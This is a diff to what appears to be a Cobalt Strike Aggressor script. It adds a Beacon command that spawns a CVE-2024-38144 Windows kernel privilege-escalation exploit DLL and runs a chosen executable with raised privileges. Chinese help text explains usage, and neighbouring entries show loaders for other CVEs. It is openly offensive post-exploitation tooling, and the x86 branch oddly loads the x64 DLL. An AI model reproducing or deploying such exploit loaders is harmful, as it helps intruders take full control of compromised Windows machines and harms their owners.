@@ -116,6 +116,26 @@ alias CVE-2024-38054 {
 beacon_command_register("CVE-2024-38054", "CVE-2024-38054", "CVE-2024-38054提权，ksthunk提权漏洞。后面跟要运行的exe全路径\n\n 使用说明:CVE-2024-38054 c:\\a.exe");
 
 
+
+alias CVE-2024-38144 {
+
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $archdll = script_resource("CVE-2024-38144-x64.dll");
+    } else {
+        $arch = "x86";
+        $archdll = script_resource("CVE-2024-38144-x64.dll");
+    }
+
+    bdllspawn($1, $archdll, $2, "test", 999999, false);
+}
+
+beacon_command_register("CVE-2024-38144", "CVE-2024-38144", "CVE-2024-38144提权，ksthunk提权漏洞。后面跟要运行的exe全路径\n\n 使用说明:CVE-2024-38144 c:\\a.exe");
+
+
+
+
 alias CVE-2024-21338 {
 
     if (-is64 $1)
